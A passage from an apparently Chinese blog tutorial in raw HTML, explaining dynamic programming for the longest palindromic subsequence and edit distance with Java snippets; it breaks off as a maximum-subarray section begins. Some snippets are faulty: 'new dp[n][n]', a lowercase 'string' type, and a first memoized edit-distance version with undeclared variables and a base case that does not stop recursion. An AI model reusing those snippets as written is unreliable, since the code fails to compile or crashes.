href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484486&amp;idx=1&amp;sn=0bdcb94c6390307ea32427757ec0072c&amp;chksm=9bd7fa4eaca073583623cdb93b05dc9e1d0757b25697bb40b29b3e450124e929ff1a8eaac50f&amp;scene=21#wechat_redirect">最长公共子序列</a>。</p><p>下面就借最长回文子序列这个问题，详解一下第二种情况下如何使用动态规划。</p><p><strong>二、最长回文子序列</strong></p><p>之前解决了 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484471&amp;idx=1&amp;sn=7c26d04a1f035770920d31377a1ebd42&amp;chksm=9bd7fa3faca07329189e9e8b51e1a665166946b66b8e8978299ba96d5f2c0d3eafa7db08b681&amp;scene=21#wechat_redirect">最长回文子串</a> 的问题，这次提升难度，求最长回文子序列的长度：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/微信图片_20210207175159.png" alt="微信图片_20210207175159" style="zoom: 67%;" /></p><p>我们说这个问题对 dp 数组的定义是：<strong>在子串</strong>s[i..j]中，最长回文子序列的长度为$dp[i][j]$。一定要记住这个定义才能理解算法。</p><p><strong>为啥这个问题要这样定义二维的 dp 数组呢？</strong>我们前文多次提到，<strong>找状态转移需要归纳思维，说白了就是如何从已知的结果推出未知的部分</strong>，这样定义容易归纳，容易发现状态转移关系。</p><p>具体来说，如果我们想求$dp[i][j]$，假设你知道了子问题$dp[i+1][j-1]$的结果（s[i+1..j-1]中最长回文子序列的长度），你是否能想办法算出$dp[i][j]$的值（s[i..j]中，最长回文子序列的长度）呢？</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/微信图片_20210207175537.jpg" alt="微信图片_20210207175537" style="zoom: 50%;" /><img src="E:\有道云笔记存储\qq7FB9F72DBAEA505AA864E222F1AC8714(1" alt="img">\ef724f88ffa64f1683dca95e915734fd\ru5erkjggg==.gif)</p><p>可以！<strong>这取决于</strong>s[i]和s[j]的字符：</p><p><strong>如果它俩相等</strong>，那么它俩加上s[i+1..j-1]中的最长回文子序列就是s[i..j]的最长回文子序列：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/d40ce0a0f4fe891b8c5e7caee29be97.jpg" alt="d40ce0a0f4fe891b8c5e7caee29be97" style="zoom:50%;" /></p><p><strong>如果它俩不相等</strong>，说明它俩<strong>不可能同时</strong>出现在s[i..j]的最长回文子序列中，那么把它俩<strong>分别</strong>加入s[i+1..j-1]中，看看哪个子串产生的回文子序列更长即可：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/92a6617a3bda4dd3692e0298581e1fd.jpg" alt="92a6617a3bda4dd3692e0298581e1fd"></p><p>以上两种情况写成代码就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (s[i] == s[j])<br>    <span class="hljs-comment">// 它俩一定在最长回文子序列中</span><br>    dp[i][j] = dp[i + <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// s[i+1..j] 和 s[i..j-1] 谁的回文子序列更长？</span><br>    dp[i][j] = max(dp[i + <span class="hljs-number">1</span>][j], dp[i][j - <span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><p>至此，状态转移方程就写出来了，根据 dp 数组的定义，我们要求的就是$dp[0][n - 1]$，也就是整个s的最长回文子序列的长度。</p><p><strong>三、代码实现</strong></p><p>首先明确一下 base case，如果只有一个字符，显然最长回文子序列长度是 1，也就是$dp[i][j] = 1,(i == j)$。</p><p>因为i肯定小于等于j，所以对于那些i &gt; j的位置，根本不存在什么子序列，应该初始化为 0。</p><p>另外，看看刚才写的状态转移方程，想求$dp[i][j]$需要知道$dp[i+1][j-1]，dp[i+1][j]，dp[i][j-1]$这三个位置；再看看我们确定的 base case，填入 dp 数组之后是这样：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1ff63aa9b1d9c37969b9f6169cdede1.jpg" alt="1ff63aa9b1d9c37969b9f6169cdede1" style="zoom: 80%;" /><img src="E:\有道云笔记存储\qq7FB9F72DBAEA505AA864E222F1AC8714(1" alt="img">\ef724f88ffa64f1683dca95e915734fd\ru5erkjggg==.gif)</p><p><strong>为了保证每次计算</strong>$dp[i][j]$，左、下、左下三个方向的位置已经被计算出来，只能斜着遍历或者反着遍历：</p><p><img src="E:\有道云笔记存储\qq7FB9F72DBAEA505AA864E222F1AC8714(1" alt="img">\ef724f88ffa64f1683dca95e915734fd\ru5erkjggg==.gif)    <img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/c0bfdaaf0f4d9f49fa50bd65dc47eb4.jpg" alt="c0bfdaaf0f4d9f49fa50bd65dc47eb4" style="zoom:80%;" /></p><p>我选择反着遍历，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">longestPalindromeSubseq</span><span class="hljs-params">(string s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = s.length();<br>    <span class="hljs-comment">// dp 数组全部初始化为 0</span><br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> dp[n][n];<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        dp[i][i] = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 反着遍历保证正确的状态转移</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-comment">// 状态转移方程</span><br>            <span class="hljs-keyword">if</span> (s.charAt(i) == s.charAt(j))<br>                dp[i][j] = dp[i + <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">else</span><br>                dp[i][j] = Math.max(dp[i + <span class="hljs-number">1</span>][j], dp[i][j - <span class="hljs-number">1</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 整个 s 的最长回文子串长度</span><br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][n - <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，最长回文子序列的问题就解决了。</p><p>主要还是正确定义 dp 数组的含义，遇到子序列问题，首先想到两种动态规划思路，然后根据实际问题看看哪种思路容易找到状态转移关系。</p><p>另外，找到状态转移和 base case 之后，<strong>一定要观察 DP table</strong>，看看怎么遍历才能保证通过已计算出来的结果解决新的问题</p><p>有了以上思路方向，子序列问题也不过如此嘛。</p><h2 id="6-2-经典动态规划：编辑距离"><a href="#6-2-经典动态规划：编辑距离" class="headerlink" title="6.2 经典动态规划：编辑距离"></a>6.2 经典动态规划：编辑距离</h2><p>编辑距离</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离.jpg" alt="编辑距离" style="zoom:50%;" /></p><p><strong>一、思路</strong></p><p>编辑距离问题就是给我们两个字符串 <code>s1</code> 和 <code>s2</code>，只能用三种操作，让我们把 <code>s1</code> 变成 <code>s2</code>，求最少的操作数。需要明确的是，不管是把 <code>s1</code> 变成 <code>s2</code> 还是反过来，结果都是一样的，所以后文就以 <code>s1</code> 变成 <code>s2</code> 举例。</p><p>前文「最长公共子序列」说过，<strong>解决两个字符串的动态规划问题，一般都是用两个指针</strong> <strong><code>i,j</code></strong> <strong>分别指向两个字符串的最后，然后一步步往前走，缩小问题的规模</strong>。</p><p>设两个字符串分别为 “rad” 和 “apple”，为了把 <code>s1</code> 变成 <code>s2</code>，算法会这样进行：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离1.gif" alt="编辑距离1" style="zoom:50%;" /></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离2.jpg" alt="编辑距离2" style="zoom:50%;" /></p><p>请记住这个 GIF 过程，这样就能算出编辑距离。关键在于如何做出正确的操作，稍后会讲。</p><p>根据上面的 GIF，可以发现操作不只有三个，其实还有第四个操作，就是什么都不要做（skip）。比如这个情况：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离3.jpg" alt="编辑距离3" style="zoom:50%;" /></p><p>因为这两个字符本来就相同，为了使编辑距离最小，显然不应该对它们有任何操作，直接往前移动 <code>i,j</code> 即可。</p><p>还有一个很容易处理的情况，就是 <code>j</code> 走完 <code>s2</code> 时，如果 <code>i</code> 还没走完 <code>s1</code>，那么只能用删除操作把 <code>s1</code> 缩短为 <code>s2</code>。比如这个情况：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离4.jpg" alt="编辑距离4" style="zoom:50%;" /></p><p>类似的，如果 <code>i</code> 走完 <code>s1</code> 时 <code>j</code> 还没走完了 <code>s2</code>，那就只能用插入操作把 <code>s2</code> 剩下的字符全部插入 <code>s1</code>。待会可以看到，这两种情况就是算法的 <strong>base case</strong>。</p><p>下面详解一下如何将思路转换成代码，坐稳，要发车了。</p><p><strong>二、代码详解</strong></p><p>先梳理一下之前的思路：</p><p>base case 是 <code>i</code> 走完 <code>s1</code> 或 <code>j</code> 走完 <code>s2</code>，可以直接返回另一个字符串剩下的长度。</p><p>对于每对字符 <code>s1[i]</code> 和 <code>s2[j]</code>，可以有四种操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> s1[i] == s2[j]:<br>    啥都别做（skip）<br>    i, j 同时向前移动<br><span class="hljs-keyword">else</span>:<br>    三选一：<br>        插入（insert）<br>        删除（delete）<br>        替换（replace）<br></code></pre></td></tr></table></figure><p>有这个框架，问题就已经解决了。读者也许会问，这个「三选一」到底该怎么选择呢？很简单，全试一遍，哪个操作最后得到的编辑距离最小，就选谁。这里需要递归技巧，理解需要点技巧，先看下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">String word1,word2;<br><span class="hljs-keyword">int</span> dp[][];<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String word1, String word2)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.word1 = word1;<br>        <span class="hljs-keyword">this</span>.word2 = word2;<br>        length1 = word1.length();<br>        length2 = word2.length();<br>        <span class="hljs-keyword">this</span>.dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[length1][length2];<br>   <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; length1;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j &lt; length2;j++)&#123;<br>                dp[i][j] = -<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-comment">//i，j 初始化指向最后一个索引</span><br>    <span class="hljs-keyword">return</span> helper(length1 - <span class="hljs-number">1</span>, length2 - <span class="hljs-number">1</span>);<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">helper</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i,<span class="hljs-keyword">int</span> j)</span></span>&#123;<br>        <span class="hljs-comment">//备忘录</span><br>        <span class="hljs-keyword">if</span>(dp[i][j] &gt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> dp[i][j];<br>        &#125;<br>        <span class="hljs-comment">//base case</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>) &#123;<br>            dp[i][j] = i + j;<br>        &#125; <br>        <span class="hljs-comment">//状态转移</span><br>        <span class="hljs-keyword">if</span>(word1.charAt(i) == word2.charAt(j))&#123;<br>            dp[i][j] = helper(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>);  <span class="hljs-comment">//啥都不做</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//插入，删除，替换</span><br>            dp[i][j] =  Math.min(<br>                Math.min(helper(i, j - <span class="hljs-number">1</span>), helper(i - <span class="hljs-number">1</span>, j)),<br>                helper(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>        &#125;   <br>        <span class="hljs-keyword">return</span> dp[i][j];<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><p>下面来详细解释一下这段递归代码，base case 应该不用解释了，主要解释一下递归部分。</p><p>都说递归代码的可解释性很好，这是有道理的，只要理解函数的定义，就能很清楚地理解算法的逻辑。我们这里 dp(i, j) 函数的定义是这样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">helper</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i,<span class="hljs-keyword">int</span> j)</span></span>;<br># 返回 s1[0..i] 和 s2[0..j] 的最小编辑距离<br></code></pre></td></tr></table></figure><p><strong>记住这个定义</strong>之后，先来看这段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(s1[i] == s2[j])&#123;<br><span class="hljs-keyword">return</span> dp(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>)  <span class="hljs-comment">//啥都不做</span><br>&#125;<br>    <br><span class="hljs-comment">// 解释：</span><br><span class="hljs-comment">// 本来就相等，不需要任何操作</span><br><span class="hljs-comment">// s1[0..i] 和 s2[0..j] 的最小编辑距离等于</span><br><span class="hljs-comment">// s1[0..i-1] 和 s2[0..j-1] 的最小编辑距离</span><br><span class="hljs-comment">// 也就是说 dp(i, j) 等于 dp(i-1, j-1)</span><br></code></pre></td></tr></table></figure><p>如果 <code>s1[i]！=s2[j]</code>，就要对三个操作递归了，稍微需要点思考：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">dp(i, j - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>,    <span class="hljs-comment">// 插入</span><br><span class="hljs-comment">// 解释：</span><br><span class="hljs-comment">// 我直接在 s1[i] 插入一个和 s2[j] 一样的字符</span><br><span class="hljs-comment">// 那么 s2[j] 就被匹配了，前移 j，继续跟 i 对比</span><br><span class="hljs-comment">// 别忘了操作数加一</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">dp(i - <span class="hljs-number">1</span>, j) + <span class="hljs-number">1</span>,    <span class="hljs-comment">// 删除</span><br><span class="hljs-comment">// 解释：</span><br><span class="hljs-comment">// 我直接把 s[i] 这个字符删掉</span><br><span class="hljs-comment">// 前移 i，继续跟 j 对比</span><br><span class="hljs-comment">// 操作数加一</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">dp(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span> <span class="hljs-comment">// 替换</span><br><span class="hljs-comment">// 解释：</span><br><span class="hljs-comment">// 我直接把 s1[i] 替换成 s2[j]，这样它俩就匹配了</span><br><span class="hljs-comment">// 同时前移 i，j 继续对比</span><br><span class="hljs-comment">// 操作数加一</span><br></code></pre></td></tr></table></figure><p>现在，你应该完全理解这段短小精悍的代码了。还有点小问题就是，这个解法是暴力解法，存在重叠子问题，需要用动态规划技巧来优化。</p><p><strong>怎么能一眼看出存在重叠子问题呢</strong>？前文「动态规划之正则表达式」有提过，这里再简单提一下，需要抽象出本文算法的递归框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(i, j)</span></span>&#123;<br>    dp(i - 1, j - 1) #1<br>    dp(i, j - 1)     #2<br>    dp(i - 1, j)     #3<br>&#125;<br></code></pre></td></tr></table></figure><p>对于子问题 <code>dp(i-1, j-1)</code>，如何通过原问题 <code>dp(i, j)</code> 得到呢？有不止一条路径，比如 <code>dp(i, j) -&gt; #1</code> 和 <code>dp(i, j) -&gt; #2 -&gt; #3</code>。一旦发现一条重复路径，就说明存在巨量重复路径，也就是重叠子问题。</p><p><strong>三、动态规划优化</strong></p><p>对于重叠子问题呢，前文「动态规划详解」详细介绍过，优化方法无非是备忘录或者 DP table。</p><p>备忘录很好加，原来的代码稍加修改即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java">    String word1,word2;<br><span class="hljs-comment">//备忘录</span><br>    <span class="hljs-keyword">int</span> dp[][];<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String word1, String word2)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.word1 = word1;<br>        <span class="hljs-keyword">this</span>.word2 = word2;<br>        <span class="hljs-keyword">int</span> length1 = word1.length();<br>        <span class="hljs-keyword">int</span> length2 = word2.length();<br>        <span class="hljs-keyword">this</span>.dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[length1 + <span class="hljs-number">1</span>][length2 + <span class="hljs-number">1</span>];<br>   <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt;= length1;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j &lt;= length2;j++)&#123;<br>                dp[i][j] = -<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-comment">//i，j 初始化指向最后一个索引</span><br>    <span class="hljs-keyword">return</span> helper(length1, length2);<br>&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">helper</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i,<span class="hljs-keyword">int</span> j)</span></span>&#123;<br>        <span class="hljs-comment">//备忘录</span><br>        <span class="hljs-keyword">if</span>(dp[i][j] &gt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> dp[i][j];<br>        &#125;<br>        <span class="hljs-comment">//base case</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>) &#123;<br>            dp[i][j] = i + j;<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//状态转移</span><br>            <span class="hljs-keyword">if</span>(word1.charAt(i - <span class="hljs-number">1</span>) == word2.charAt(j - <span class="hljs-number">1</span>))&#123;<br>                dp[i][j] = helper(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>);  <span class="hljs-comment">//啥都不做</span><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//插入，删除，替换</span><br>                dp[i][j] =  Math.min(<br>                    Math.min(helper(i, j - <span class="hljs-number">1</span>), helper(i - <span class="hljs-number">1</span>, j)),<br>                    helper(i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>           <br>        <span class="hljs-keyword">return</span> dp[i][j];<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>主要说下 DP table 的解法</strong>：</p><p>首先明确 dp 数组的含义，dp 数组是一个二维数组，长这样：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离5.jpg" alt="编辑距离5" style="zoom:50%;" /></p><p>有了之前递归解法的铺垫，应该很容易理解。<code>dp[..][0]</code> 和 <code>dp[0][..]</code> 对应 base case，<code>dp[i][j]</code> 的含义和之前的 dp 函数类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dp</span><span class="hljs-params">(i,j)</span></span>&#123;&#125;<span class="hljs-comment">// 返回 s1[0..i] 和 s2[0..j] 的最小编辑距离</span><br>dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]<span class="hljs-comment">// 存储 s1[0..i] 和 s2[0..j] 的最小编辑距离</span><br></code></pre></td></tr></table></figure><p>dp 函数的 base case 是 <code>i,j</code> 等于 -1，而数组索引至少是 0，所以 dp 数组会偏移一位。</p><p>既然 dp 数组和递归 dp 函数含义一样，也就可以直接套用之前的思路写代码，<strong>唯一不同的是，DP table 是自底向上求解，递归解法是自顶向下求解</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String s1, String s2)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = s1.length(), n = s2.length();<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m + <span class="hljs-number">1</span>][n + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// base case </span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>        dp[i][<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>        dp[<span class="hljs-number">0</span>][j] = j;<br>    <span class="hljs-comment">// 自底向上求解</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>            <span class="hljs-keyword">if</span> (s1.charAt(i-<span class="hljs-number">1</span>) == s2.charAt(j-<span class="hljs-number">1</span>))&#123;<br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            &#125; <br>            <span class="hljs-keyword">else</span>&#123;<br>                dp[i][j] = Math.min(<br>                    Math.min(dp[i - <span class="hljs-number">1</span>][j] + <span class="hljs-number">1</span>,dp[i][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>),<br>                    dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span><br>                );<br>            &#125;               <br>                <br>    <span class="hljs-comment">// 储存着整个 s1 和 s2 的最小编辑距离</span><br>    <span class="hljs-keyword">return</span> dp[m][n];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>四、扩展延伸</strong></p><p>一般来说，处理两个字符串的动态规划问题，都是按本文的思路处理，建立 DP table。为什么呢，因为易于找出状态转移的关系，比如编辑距离的 DP table：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离6.jpg" alt="编辑距离6" style="zoom:50%;" /></p><p>还有一个细节，既然每个 <code>dp[i][j]</code> 只和它附近的三个状态有关，空间复杂度是可以压缩成 <code>O(min(M, N))</code> 的（M，N 是两个字符串的长度）。不难，但是可解释性大大降低，读者可以自己尝试优化一下。</p><p>你可能还会问，<strong>这里只求出了最小的编辑距离，那具体的操作是什么</strong>？你之前举的修改公众号文章的例子，只有一个最小编辑距离肯定不够，还得知道具体怎么修改才行。</p><p>这个其实很简单，代码稍加修改，给 dp 数组增加额外的信息即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// int[][] dp;</span><br>Node[][] dp;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-keyword">int</span> choice;<br>    <span class="hljs-comment">// 0 代表啥都不做</span><br>    <span class="hljs-comment">// 1 代表插入</span><br>    <span class="hljs-comment">// 2 代表删除</span><br>    <span class="hljs-comment">// 3 代表替换</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>val</code> 属性就是之前的 dp 数组的数值，<code>choice</code> 属性代表操作。在做最优选择时，顺便把操作记录下来，然后就从结果反推具体操作。</p><p>我们的最终结果不是 <code>dp[m][n]</code> 吗，这里的 <code>val</code> 存着最小编辑距离，<code>choice</code> 存着最后一个操作，比如说是插入操作，那么就可以左移一格：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离7.jpg" alt="编辑距离7" style="zoom:50%;" /></p><p>重复此过程，可以一步步回到起点 <code>dp[0][0]</code>，形成一条路径，按这条路径上的操作进行编辑，就是最佳方案。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/编辑距离8.jpg" alt="编辑距离8" style="zoom:50%;" /></p><h2 id="6-3-动态规划设计：最大子数组"><a href="#6-3-动态规划设计：最大子数组" class="headerlink" title="6.3 动态规划设计：最大子数组"></a>6.3 动态规划设计：最大子数组</h2><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/最大子数组.jpg" alt="img" style="zoom:50%;" /></p><p><strong>一、思路分析</strong></p><p>其实第一次看到这道题，我首先想到的是<a 